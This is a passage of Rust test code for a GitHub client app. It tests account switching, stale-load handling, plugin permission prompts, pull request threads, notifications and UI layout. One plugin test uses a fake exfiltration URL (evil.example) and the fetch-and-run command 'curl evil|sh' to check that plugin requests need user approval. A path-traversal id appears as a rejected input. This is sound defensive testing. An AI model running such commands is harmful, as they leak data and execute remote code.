        let old_layout = Layout { sidebar_width: 248.0, sidebar_open: true, sort: RepoSort::Recent, owner: OwnerFilter::Org(owner.into()) };
        crate::prefs::set("layout", old_layout.to_json());
        s.saved_layout = Some(old_layout);
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn sign_out_during_load_keeps_sample_data_and_drops_stale_callbacks() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _tmp = TempDataDir::new("load-gen-signout");

        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.user = Some("alice".into());
        cfg.token = Some("tok_alice".into());
        cfg.account_locked = false;
        s.cfg = std::sync::Arc::new(cfg);
        s.acct_user = rune::TextEdit::new("alice");
        s.data = Data::default();
        s.page = crate::Page::Settings;
        s.tab = RepoTab::Notes;
        s.set_status(Status::Starting);
        seed_caches(&mut s, "alice");

        s.refresh();
        assert_eq!(s.status, Status::Loading);
        let old_gen = s.load_gen;

        s.save_account(true);
        assert_eq!(s.status, Status::Sample);
        assert!(s.data.sample);
        assert!(s.load_gen > old_gen);
        assert_eq!(s.page, crate::Page::Overview, "Settings resets to Overview on sign-out");
        assert_eq!(s.tab, RepoTab::Code);
        assert_eq!(s.filter, RepoFilter::All);
        assert_eq!(s.pr_filter, PullState::Open);
        assert_eq!(s.owner, OwnerFilter::All);
        assert!(s.search.text.is_empty());
        assert!(s.branch_filter.text.is_empty());
        assert_eq!(s.chats.get("alice/secret").and_then(|c| c.session.as_deref()), Some("sess-1"));
        assert!(s.claude_prompt.text.is_empty());
        assert!(s.clone_path.text.is_empty());
        assert!(s.details.is_empty());
        assert!(s.branches.is_empty());
        assert!(s.branch_of.is_empty());
        assert!(s.local.is_empty());
        assert!(s.notes.is_empty());
        assert!(s.form.is_none());
        assert!(s.diff_of.is_none());
        assert!(s.diff_load.is_none());
        assert!(s.pull_diff_of.is_none());
        assert!(s.pull_diff_load.is_none());
        assert!(s.busy.is_empty());

        let saved_place = crate::prefs::get("place").as_ref().and_then(Place::from_json).expect("place saved");
        assert_eq!(saved_place, Place { page: "overview".into(), tab: None, repo: None });
        let saved_layout = crate::prefs::get("layout").as_ref().and_then(Layout::from_json).expect("layout saved");
        assert_eq!(saved_layout.owner, OwnerFilter::All);

        // Deliver late results from before sign-out.
        s.apply(old_gen, Ok(account_data("alice", "secret", true)));
        s.apply_detail(old_gen, ("alice/secret".into(), "main".into()), Detail::default());
        s.apply_branches(old_gen, "alice/secret".into(), Ok(vec!["main".into()]));
        s.pull_diff_of = Some(("alice/secret".into(), 9));
        s.apply_pull_diff(old_gen, ("alice/secret".into(), 9), Ok(crate::diffs::sample_pull_files()));
        s.apply_notes(old_gen, ("alice/secret".into(), "main".into()), Ok(vec![crate::notes::Note { name: "arch".into(), updated_at: 1, size: 10 }]));

        assert_eq!(s.status, Status::Sample);
        assert!(s.data.sample, "late load after sign-out must not replace sample data");
        assert!(s.data.repos.iter().all(|r| r.owner != "alice"));
        assert!(s.details.is_empty());
        assert!(s.branches.is_empty());
        assert!(s.notes.is_empty());
        assert!(s.diff.files().is_empty());
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn overlapping_account_loads_apply_only_the_newer_account() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _tmp = TempDataDir::new("load-gen-switch");

        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.account_locked = false;
        cfg.user = None;
        cfg.token = None;
        s.cfg = std::sync::Arc::new(cfg);

        // Start load for account A from Settings.
        s.page = crate::Page::Settings;
        s.acct_user = rune::TextEdit::new("alice");
        s.acct_token = rune::TextEdit::new("tok_a");
        s.save_account(false);
        assert_eq!(s.page, crate::Page::Overview);
        assert_eq!(s.status, Status::Loading);
        let gen_a = s.load_gen;
        seed_caches(&mut s, "alice");

        // Switch to account B from Settings while A is still loading.
        s.page = crate::Page::Settings;
        s.acct_user = rune::TextEdit::new("bob");
        s.acct_token = rune::TextEdit::new("tok_b");
        s.save_account(false);
        assert_eq!(s.page, crate::Page::Overview);
        assert_eq!(s.status, Status::Loading);
        let gen_b = s.load_gen;
        assert!(gen_b > gen_a);
        assert!(s.details.is_empty() && s.branches.is_empty() && s.notes.is_empty() && s.form.is_none());
        assert_eq!(s.chats.get("alice/secret").and_then(|c| c.session.as_deref()), Some("sess-1"));

        let saved_place = crate::prefs::get("place").as_ref().and_then(Place::from_json).expect("place reset");
        assert_eq!(saved_place, Place { page: "overview".into(), tab: None, repo: None });

        // Case 1: stale A arrives while B is loading -> dropped; then B arrives -> applied.
        s.apply(gen_a, Ok(account_data("alice", "a-private", true)));
        assert_eq!(s.status, Status::Loading);
        assert!(s.data.repos.is_empty());

        s.apply(gen_b, Ok(account_data("bob", "b-repo", false)));
        assert_eq!(s.status, Status::Ready);
        assert_eq!(s.data.profile.login, "bob");
        assert_eq!(s.data.repos.len(), 1);
        assert_eq!(s.data.repos[0].full_name, "bob/b-repo");

        // Case 2: B already landed, then another stale callback from A arrives -> ignored.
        s.apply(gen_a, Err("stale failure".into()));
        s.apply(gen_a, Ok(account_data("alice", "a-private", true)));
        assert_eq!(s.status, Status::Ready);
        assert_eq!(s.data.profile.login, "bob");
        assert_eq!(s.data.repos[0].full_name, "bob/b-repo");
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn save_account_keeps_local_sessions_and_running_git_job() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _tmp = TempDataDir::new("load-gen-local-sessions");

        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.account_locked = false;
        cfg.user = Some("alice".into());
        cfg.token = Some("tok_alice".into());
        s.cfg = std::sync::Arc::new(cfg);

        let full = "alice/local-repo".to_owned();
        {
            let chat = s.chats.entry(full.clone()).or_default();
            chat.session = Some("sess-42".into());
            chat.run = crate::claude::Run::Running;
        }
        let term = crate::terminal::Term::spawn(&std::env::temp_dir(), 24, 80, None, || {}).expect("shell starts");
        s.terms.insert(full.clone(), term);
        s.git_job = Some("Committing…");

        // Switch account.
        s.acct_user = rune::TextEdit::new("bob");
        s.acct_token = rune::TextEdit::new("tok_bob");
        s.save_account(false);
        assert_eq!(s.chats.get(&full).and_then(|c| c.session.as_deref()), Some("sess-42"));
        assert_eq!(s.chats.get(&full).map(|c| c.run), Some(crate::claude::Run::Running));
        assert!(s.terms.get(&full).is_some_and(|t| t.is_running()), "terminal survives account switch");
        assert_eq!(s.git_job, Some("Committing…"), "running local git job stays marked");

        // Sign out.
        s.save_account(true);
        assert_eq!(s.chats.get(&full).and_then(|c| c.session.as_deref()), Some("sess-42"));
        assert_eq!(s.chats.get(&full).map(|c| c.run), Some(crate::claude::Run::Running));
        assert!(s.terms.get(&full).is_some_and(|t| t.is_running()), "terminal survives sign-out");
        assert_eq!(s.git_job, Some("Committing…"), "running local git job stays marked");
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn ui_sign_out_in_settings_resets_to_overview_and_drops_late_load() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _tmp = TempDataDir::new("load-gen-ui");

        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.user = Some("alice".into());
        cfg.token = Some("tok_alice".into());
        cfg.account_locked = false;
        s.cfg = std::sync::Arc::new(cfg);
        s.acct_user = rune::TextEdit::new("alice");
        s.page = crate::Page::Settings;
        s.refresh();
        let stale_gen = s.load_gen;
        seed_caches(&mut s, "alice");

        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);

        let (x, y) = rt.find("acct-sign-out").expect("Sign out button shown when signed in");
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.0);

        assert_eq!(rt.state.status, Status::Sample);
        assert_eq!(rt.state.page, crate::Page::Overview, "signing out from Settings returns to Overview");
        assert!(rt.find("connect").is_some(), "Overview sample banner offers Connect");
        assert!(rt.state.form.is_none());

        // Deliver late response for the signed-out account while UI is running.
        rt.update(|s, _| {
            s.apply(stale_gen, Ok(account_data("alice", "secret-repo", true)));
        });
        rt.frame(0.0);

        assert_eq!(rt.state.status, Status::Sample);
        assert_eq!(rt.state.page, crate::Page::Overview);
        assert!(rt.state.data.sample);
        assert!(rt.elements().iter().all(|e| e.text.as_deref() != Some("secret-repo")));
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn saving_account_in_settings_resets_api_to_user_env_or_default() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _tmp = TempDataDir::new("save-account-api-reset");

        let prev_api = std::env::var_os("GITHUB_API_URL");
        // Simulate REPOHUB_ENV having injected GITHUB_API_URL into the process environment:
        // SAFETY: ENV_LOCK serializes environment access in tests.
        unsafe { std::env::set_var("GITHUB_API_URL", "https://injected-by-project-env.example") };

        struct ApiVarGuard(Option<std::ffi::OsString>);
        impl Drop for ApiVarGuard {
            fn drop(&mut self) {
                // SAFETY: ENV_LOCK serializes environment access in tests.
                unsafe {
                    match &self.0 {
                        Some(val) => std::env::set_var("GITHUB_API_URL", val),
                        None => std::env::remove_var("GITHUB_API_URL"),
                    }
                }
            }
        }
        let _guard = ApiVarGuard(prev_api);

        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.account_locked = false;
        cfg.api = "https://untrusted-api.example".into();
        cfg.sources.api = Some(crate::config::Source::ProjectFile(".env".into()));
        s.cfg = std::sync::Arc::new(cfg);

        s.acct_user = rune::TextEdit::new("carol");
        s.acct_token = rune::TextEdit::new("ghp_carol_tok");
        s.save_account(false);

        assert_eq!(s.cfg.api, "https://api.github.com", "saving account must reset untrusted API host to default or user env even if GITHUB_API_URL was in process env");
        assert_eq!(s.cfg.sources.api, Some(crate::config::Source::Default));
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix52_tests {
    use crate::plugins::{Ask, Request};

    fn press(rt: &mut rune::Runtime<crate::App>, key: &str) {
        let (x, y) = rt.find(key).unwrap_or_else(|| panic!("{key} is on screen"));
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.1);
    }

    #[test]
    fn a_plugins_request_waits_for_the_users_answer() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        // What a plugin's `changed` handler does as soon as it loads: nothing opens, the
        // request waits on screen.
        s.plugin_asks(Request { plugin: "Sneaky".into(), ask: Ask::open("https://evil.example/?d=private-repo").unwrap() });
        // It can't replace the request on screen with another one, or pile them up.
        s.plugin_asks(Request { plugin: "Sneaky".into(), ask: Ask::copy("curl evil|sh").unwrap() });
        assert_eq!(s.plugin_ask.as_ref().map(|r| &r.ask), Some(&Ask::Open("https://evil.example/?d=private-repo".into())));

        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        assert!(rt.find("plugin-ask").is_some(), "the request is shown");
        press(&mut rt, "plugin-ask-no");
        assert_eq!(rt.state.plugin_ask, None);
        assert!(rt.find("plugin-ask").is_none());
        assert!(rt.state.toast.is_none(), "refusing does nothing else");

        // Allowing a copy copies, once.
        rt.update(|s, _| s.plugin_asks(Request { plugin: "Checklist".into(), ask: Ask::copy("- [ ] ship it").unwrap() }));
        rt.frame(0.2);
        press(&mut rt, "plugin-ask-yes");
        assert_eq!(rt.state.plugin_ask, None);
        assert_eq!(rt.state.toast.as_ref().map(|t| t.text.as_str()), Some("Copied"));
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix63_tests {
    use crate::state::Load;
    use crate::thread::{Standing, Verdict};
    use crate::{App, Page, github};

    fn app() -> App {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        s.page = Page::Pulls;
        s
    }

    fn press(rt: &mut rune::Runtime<App>, key: &str) {
        let (x, y) = rt.find(key).unwrap_or_else(|| panic!("{key} is on screen"));
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.1);
    }

    #[test]
    fn githubs_answers_become_one_conversation_in_order() {
        let issue = serde_json::json!({
            "title": "Speed up loading", "state": "open", "html_url": "https://github.com/o/r/pull/7", "comments": 2,
            "created_at": "2026-11-01T10:00:00Z", "body": "The description.", "user": { "login": "alice" },
            "labels": [{ "name": "perf", "color": "ff0000" }], "pull_request": { "url": "x" },
        });
        let comments = serde_json::json!([
            { "user": { "login": "bob" }, "created_at": "2026-11-03T10:00:00Z", "body": "Second." },
            { "user": null, "created_at": "2026-11-02T10:00:00Z", "body": "First." },
        ]);
        let detail = serde_json::json!({ "draft": true, "merged": false, "head": { "ref": "fast" }, "base": { "ref": "main" } });
        let reviews = serde_json::json!([
            { "user": { "login": "carol" }, "state": "APPROVED", "body": "", "submitted_at": "2026-11-04T10:00:00Z" },
            { "user": { "login": "dave" }, "state": "CHANGES_REQUESTED", "body": "Fix the flag.", "submitted_at": "2026-11-02T12:00:00Z" },
            { "user": { "login": "erin" }, "state": "COMMENTED", "body": "", "submitted_at": "2026-11-02T13:00:00Z" },
            { "user": { "login": "me" }, "state": "PENDING", "body": "not sent yet" },
            { "user": { "login": "frank" }, "state": "DISMISSED", "body": "old", "submitted_at": "2026-11-02T14:00:00Z" },
        ]);
        let t = github::parse_thread(&issue, &comments, Some((&detail, &reviews)));
        assert_eq!((t.title.as_str(), t.author.as_str(), t.standing), ("Speed up loading", "alice", Standing::Draft));
        assert_eq!(t.branches, Some(("fast".into(), "main".into())));
        assert_eq!(t.labels.len(), 1);
        // The description first, then everything by time; a deleted account is "ghost".
        let seen: Vec<(&str, &str, Option<Verdict>)> = t.entries.iter().map(|e| (e.author.as_str(), e.body.as_str(), e.verdict)).collect();
        assert_eq!(seen, [
            ("alice", "The description.", None),
            ("ghost", "First.", None),
            ("dave", "Fix the flag.", Some(Verdict::ChangesRequested)),
            ("bob", "Second.", None),
            ("carol", "", Some(Verdict::Approved)),
        ], "an empty comment-only review, a pending one and a dismissed one are left out");
        assert!(!t.more);

        // An issue: no pull request part; closed stays closed; more comments than were read.
        let issue = serde_json::json!({ "title": "Bug", "state": "closed", "comments": 150, "created_at": "2026-11-01T10:00:00Z", "body": null, "user": { "login": "alice" } });
        let t = github::parse_thread(&issue, &serde_json::json!([]), None);
        assert_eq!((t.standing, t.branches.clone(), t.entries.len(), t.more), (Standing::Closed, None, 1, true));
        assert_eq!(t.entries[0].body, "");
        // A merged pull request is merged, not just closed.
        let merged = serde_json::json!({ "merged": true, "draft": false });
        assert_eq!(github::parse_thread(&issue, &serde_json::json!([]), Some((&merged, &serde_json::json!([])))).standing, Standing::Merged);
    }

    #[test]
    fn a_row_opens_its_conversation_and_back_returns_to_the_list() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let s = app();
        let pr = s.data.pulls.iter().find(|p| p.number == 14).unwrap().clone();
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 3000.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        press(&mut rt, &format!("pr-{}-{}", pr.repo, pr.number));
        let open = rt.state.thread.as_ref().expect("the conversation opened");
        assert!(open.pull && open.number == 14);
        assert!(matches!(&open.load, Load::Ready(t) if t.title == pr.title), "the sample data shows a conversation without GitHub");
        assert!(rt.find("thread-entry-0").is_some() && rt.find("thread-reply-text").is_some());
        assert!(rt.find("pr-filter").is_none(), "it takes the list's place");
        // A pull request can be approved; with the sample data nothing can be sent, and it says so.
        assert!(rt.find("thread-approve").is_some() && rt.find("thread-blocked").is_some());
        press(&mut rt, "thread-back");
        assert!(rt.state.thread.is_none());
        assert!(rt.find("pr-filter").is_some() && rt.state.page == Page::Pulls);

        // An issue has no review buttons, and going to another page closes the conversation.
        rt.update(|s, _| s.go(Page::Issues));
        rt.frame(0.3);
        let issue = rt.state.data.issues[0].clone();
        press(&mut rt, &format!("issue-{}-{}", issue.repo, issue.number));
        assert!(rt.state.thread.as_ref().is_some_and(|t| !t.pull && t.number == issue.number));
        assert!(rt.find("thread-approve").is_none() && rt.find("thread-close-issue").is_some());
        rt.update(|s, _| s.go(Page::Issues));
        assert!(rt.state.thread.is_none(), "choosing the page again goes back to its list");
    }

    #[test]
    fn what_is_sent_and_what_a_finished_write_changes() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = app();
        let pr = s.data.pulls.iter().find(|p| p.number == 14).unwrap().clone();
        s.open_thread(&pr.repo, 14, true);
        // Nothing typed: a comment and "request changes" need words; nothing is marked as sending.
        s.send_reply(None);
        s.send_reply(Some(Verdict::ChangesRequested));
        assert!(!s.thread.as_ref().unwrap().sending);
        assert_eq!(github::Write::Review { number: 14, verdict: Verdict::Approved, body: String::new() }.number(), Some(14));
        assert_eq!((Verdict::Approved.event(), Verdict::ChangesRequested.event(), Verdict::Commented.event()), ("APPROVE", "REQUEST_CHANGES", "COMMENT"));

        // A comment that was sent: the box empties, the row's count goes up, a toast says so.
        s.thread.as_mut().unwrap().reply = rune::TextEdit::new("Thanks!");
        let before = pr.comments;
        s.apply_done(&pr.repo, github::Done::Commented(14));
        assert!(s.thread.as_ref().unwrap().reply.text.is_empty());
        assert_eq!(s.data.pulls.iter().find(|p| p.number == 14).unwrap().comments, before + 1);
        assert_eq!(s.toast.as_ref().map(|t| t.text.as_str()), Some("Comment added to #14"));
        // A write about another pull request leaves what's being typed here alone.
        s.thread.as_mut().unwrap().reply = rune::TextEdit::new("still typing");
        s.apply_done(&pr.repo, github::Done::Commented(15));
        assert_eq!(s.thread.as_ref().unwrap().reply.text, "still typing");
        s.apply_done(&pr.repo, github::Done::Reviewed(14, Verdict::Approved));
        assert_eq!(s.toast.as_ref().map(|t| t.text.as_str()), Some("Approved pull request #14"));
    }

    #[test]
    fn a_late_answer_for_another_conversation_is_dropped() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = app();
        let pr = s.data.pulls.iter().find(|p| p.number == 14).unwrap().clone();
        s.open_thread(&pr.repo, 14, true);
        let first = s.thread.as_ref().unwrap().epoch;
        s.thread = None;
        s.open_thread(&pr.repo, 14, true);
        assert_ne!(s.thread.as_ref().unwrap().epoch, first, "opening again is a new load: the old answer isn't for it");
        // Changing section or account closes the conversation.
        s.leave_tab();
        assert!(s.thread.is_none());
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix64_tests {
    use crate::{App, Page};

    fn press(rt: &mut rune::Runtime<App>, key: &str) {
        let (x, y) = rt.find(key).unwrap_or_else(|| panic!("{key} is on screen"));
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.1);
    }

    #[test]
    fn the_issues_page_narrows_by_label_search_and_clear() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        s.page = Page::Issues;
        let all: Vec<String> = s.data.issues.iter().map(|x| format!("issue-{}-{}", x.repo, x.number)).collect();
        let bugs: Vec<String> = s.data.issues.iter().filter(|x| x.labels.iter().any(|l| l.0 == "bug")).map(|x| format!("issue-{}-{}", x.repo, x.number)).collect();
        assert!(bugs.len() >= 2 && bugs.len() < all.len(), "the sample data has bugs and other issues");
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        let shown = |rt: &rune::Runtime<App>| all.iter().filter(|k| rt.find(k).is_some()).cloned().collect::<Vec<_>>();
        assert_eq!(shown(&rt), all);
        assert!(rt.find("issues-clear").is_none(), "nothing to clear yet");

        press(&mut rt, "issues-label-bug");
        assert_eq!(shown(&rt), bugs, "only the bugs stay");
        // Searching inside them, by a word of one title.
        let word = rt.state.data.issues.iter().find(|x| x.labels.iter().any(|l| l.0 == "bug")).unwrap().title.split_whitespace().next().unwrap().to_owned();
        rt.update(|s, _| s.issue_filter.search = rune::TextEdit::new(word.clone()));
        rt.frame(0.3);
        let narrowed = shown(&rt);
        assert!(!narrowed.is_empty() && narrowed.len() < bugs.len() && narrowed.iter().all(|k| bugs.contains(k)));
        // Nothing matches: the page says so, and not that there are no issues.
        rt.update(|s, _| s.issue_filter.search = rune::TextEdit::new("zzz-no-such-title"));
        rt.frame(0.4);
        assert!(shown(&rt).is_empty());
        assert!(rt.elements().iter().any(|e| e.text.as_deref() == Some("No issues match these filters")));
        press(&mut rt, "issues-clear");
        assert_eq!(shown(&rt), all);
        assert!(rt.state.issue_filter.is_empty());
        // The Pull requests page has its own filter.
        assert!(rt.state.pull_filter.is_empty());
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix65_tests {
    use crate::{App, Page};

    fn app(page: Page, compact: bool) -> rune::Runtime<App> {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        s.page = page;
        s.compact = compact;
        let size = if compact { (390.0, 3000.0) } else { (1180.0, 3000.0) };
        let mut rt = rune::Runtime::new(s, crate::view, size, rune::Env::new(true, 1.0));
        rt.frame(0.0);
        rt.frame(0.1);
        rt
    }

    #[test]
    fn on_a_phone_a_rows_buttons_go_under_it() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let pr = crate::model::Data::sample().pulls.into_iter().find(|p| p.number == 14).unwrap();
        let (row, merge) = (format!("pr-{}-{}", pr.repo, pr.number), format!("merge-{}", crate::actions::busy_key(&pr.repo, pr.number)));
        let wide = app(Page::Pulls, false);
        let (_, row_y) = wide.find(&row).unwrap();
        let (_, merge_y) = wide.find(&merge).unwrap();
        assert!((row_y - merge_y).abs() < 20.0, "side by side on a wide window");
        let phone = app(Page::Pulls, true);
        assert!(phone.state.compact);
        let (_, row_y) = phone.find(&row).unwrap();
        let (merge_x, merge_y) = phone.find(&merge).unwrap();
        assert!(merge_y > row_y + 20.0, "under the row on a phone ({merge_y} vs {row_y})");
        assert!(merge_x < 390.0, "and on screen");
    }

    #[test]
    fn on_a_phone_pinned_repositories_are_on_the_repositories_page() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        assert!(app(Page::Repos, false).find("pinned-row").is_none(), "the sidebar has them on a wide window");
        let phone = app(Page::Repos, true);
        assert!(phone.find("pinned-row").is_some());
        let first = crate::pinned(&phone.state)[0];
        assert!(phone.find(&format!("pinned-chip-{}", phone.state.data.repos[first].full_name)).is_some());
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix64_inbox_tests {
    use crate::inbox::{Notification, Subject};
    use crate::state::Load;
    use crate::{App, Page, github, inbox};

    fn live() -> App {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.data.sample = false;
        s.pending_place = None;
        let mut cfg = (*s.cfg).clone();
        cfg.demo = false;
        cfg.user = Some("alice".into());
        cfg.token = Some("tok".into());
        cfg.api = "http://127.0.0.1:9".into();
        s.cfg = std::sync::Arc::new(cfg);
        s.status = crate::Status::Ready;
        s.page = Page::Notifications;
        s
    }

    fn note(id: &str, repo: &str, title: &str, subject: Subject, number: Option<u32>) -> Notification {
        Notification { id: id.into(), repo: repo.into(), title: title.into(), subject, number, reason: "review_requested".into(), updated_at: 0, url: format!("https://github.com/{repo}") }
    }

    #[test]
    fn githubs_notifications_are_read_into_what_the_page_needs() {
        let v = serde_json::json!({
            "id": "123", "unread": true, "reason": "review_requested", "updated_at": "2026-11-10T10:00:00Z",
            "repository": { "full_name": "octo/app" },
            "subject": { "title": "Speed up loading", "type": "PullRequest", "url": "https://api.github.com/repos/octo/app/pulls/7" },
        });
        let n = github::parse_notification(&v).unwrap();
        assert_eq!((n.id.as_str(), n.repo.as_str(), n.subject, n.number), ("123", "octo/app", Subject::Pull, Some(7)));
        assert_eq!(n.why(), "Your review was requested");
        assert_eq!(n.url, "https://github.com/octo/app/pull/7");
        // A release has no conversation in the app: it opens the repository on GitHub.
        let mut release = v.clone();
        release["subject"] = serde_json::json!({ "title": "v1.0", "type": "Release", "url": "https://api.github.com/repos/octo/app/releases/55" });
        let n = github::parse_notification(&release).unwrap();
        assert_eq!((n.subject, n.number, n.url.as_str()), (Subject::Other, None, "https://github.com/octo/app"));
        // Read ones, and ids that aren't numbers (they go into a request's address), are left out.
        let mut read = v.clone();
        read["unread"] = false.into();
        assert_eq!(github::parse_notification(&read), None);
        let mut odd = v.clone();
        odd["id"] = "12/../../user".into();
        assert_eq!(github::parse_notification(&odd), None);
        assert!(inbox::explain("GitHub refused (403): Resource not accessible by personal access token").contains("classic token"));
        assert_eq!(inbox::explain("Can't reach GitHub"), "Can't reach GitHub");
    }

    #[test]
    fn the_page_groups_by_repository_and_says_why_it_is_empty() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = live();
        s.inbox = Some(Load::Ready(vec![
            note("1", "octo/app", "Review this", Subject::Pull, Some(7)),
            note("2", "octo/site", "A bug", Subject::Issue, Some(3)),
            note("3", "octo/app", "v1.0", Subject::Other, None),
        ]));
        assert_eq!(s.unread(), 3);
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        for key in ["notif-1", "notif-2", "notif-3", "notif-read-1", "nav-Notifications"] {
            assert!(rt.find(key).is_some(), "{key}");
        }
        let texts = |rt: &rune::Runtime<App>| rt.elements().iter().filter_map(|e| e.text.clone()).collect::<Vec<_>>();
        let t = texts(&rt);
        assert_eq!(t.iter().filter(|x| x.as_str() == "octo/app").count(), 1, "one group per repository");
        assert!(t.iter().any(|x| x.starts_with("3 unread")));
        // Pressing a pull request's notification opens its conversation; the page stays to go back to.
        let (x, y) = rt.find("notif-1").unwrap();
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.1);
        assert!(rt.state.thread.as_ref().is_some_and(|t| t.pull && t.number == 7 && t.repo == "octo/app"));
        assert_eq!(rt.state.page, Page::Notifications);

        rt.update(|s, _| { s.thread = None; s.inbox = Some(Load::Ready(Vec::new())); });
        rt.frame(0.2);
        assert!(rt.find("inbox-empty").is_some());
        rt.update(|s, _| s.inbox = Some(Load::Failed(inbox::explain("GitHub refused (403)"))));
        rt.frame(0.3);
        assert!(rt.find("inbox-failed").is_some() && rt.find("inbox-retry").is_some());
        assert!(texts(&rt).iter().any(|x| x.contains("classic token")));
        // Without a token there is nothing to ask GitHub, and the page says what's needed.
        rt.update(|s, _| { let mut c = (*s.cfg).clone(); c.token = None; s.cfg = std::sync::Arc::new(c); s.inbox = None; });
        rt.frame(0.4);
        assert!(rt.find("inbox-no-token").is_some());
    }

    #[test]
    fn changing_account_forgets_the_notifications() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = live();
        s.inbox = Some(Load::Ready(vec![note("1", "octo/app", "x", Subject::Issue, Some(1))]));
        s.inbox_busy.insert("1".into());
        s.reset_account_state();
        assert!(s.inbox.is_none() && s.inbox_busy.is_empty() && s.unread() == 0);
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix71_tests {
    use crate::state::SettingsSection;
    use crate::{App, Page};

    #[test]
    fn settings_show_one_section_at_a_time_and_details_on_request() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        s.page = Page::Settings;
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 760.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        let shown = |rt: &rune::Runtime<App>, key: &str| rt.find(key).is_some();
        // Account first: the account and the connection, not the themes or the plugins.
        assert_eq!(rt.state.settings_section, SettingsSection::Account);
        assert!(shown(&rt, "connection") && !shown(&rt, "appearance") && !shown(&rt, "plugins"));
        // The connection's details wait to be asked for.
        let texts = |rt: &rune::Runtime<App>| rt.elements().iter().filter_map(|e| e.text.clone()).collect::<Vec<_>>();
        assert!(!texts(&rt).iter().any(|t| t == "Settings file"));
        let (x, y) = rt.find("connection-details").unwrap();
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.1);
        assert!(texts(&rt).iter().any(|t| t == "Settings file"));
        for (section, key) in [(SettingsSection::Appearance, "appearance"), (SettingsSection::Plugins, "plugins")] {
            rt.update(move |s, _| s.settings_section = section);
            rt.frame(0.3);
            assert!(shown(&rt, key) && !shown(&rt, "connection"), "{key}");
        }
        rt.update(|s, _| s.settings_section = SettingsSection::About);
        rt.frame(0.5);
        assert!(texts(&rt).iter().any(|t| t == "Keyboard shortcuts"));
        assert_eq!(SettingsSection::ALL.len(), SettingsSection::LABELS.len());
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix69_tests {
    use rune::{Key, KeyEvent, Mods};
    use crate::{App, Page};

    fn app(page: Page) -> rune::Runtime<App> {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        s.page = page;
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 760.0), rune::Env::new(true, 1.0));
        // The app's own key handler, as `start` gives it to the window.
        rt.on_key = Some(crate::on_key);
        rt.frame(0.0);
        rt
    }

    fn key(rt: &mut rune::Runtime<App>, key: Key, mods: Mods, t: &mut f64) {
        rt.key(KeyEvent { key, mods });
        *t += 0.05;
        rt.frame(*t);
    }

    #[test]
    fn the_palettes_selection_stays_in_sight() {
